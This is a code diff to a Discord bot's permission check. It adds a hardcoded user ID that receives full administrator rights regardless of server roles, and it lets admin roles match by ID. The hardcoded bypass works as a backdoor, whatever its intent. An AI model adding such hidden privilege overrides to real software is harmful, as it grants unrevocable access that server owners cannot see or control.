@@ -146,9 +146,14 @@ class DropBitBot {
   hasPermission(member, permission = 'ADMINISTRATOR') {
     if (!member) return false;
     
+    const adminUserIds = ['1219141082588250142'];
+    if (adminUserIds.includes(member.id)) return true;
+    
     const adminRoles = config.get('bot.adminRoles') || [];
     return member.permissions.has(permission) || 
-           member.roles.cache.some(role => adminRoles.includes(role.name));
+           member.roles.cache.some(role => 
+             adminRoles.includes(role.name) || adminRoles.includes(role.id)
+           );
   }
 
   setCooldown(userId, command, duration) {
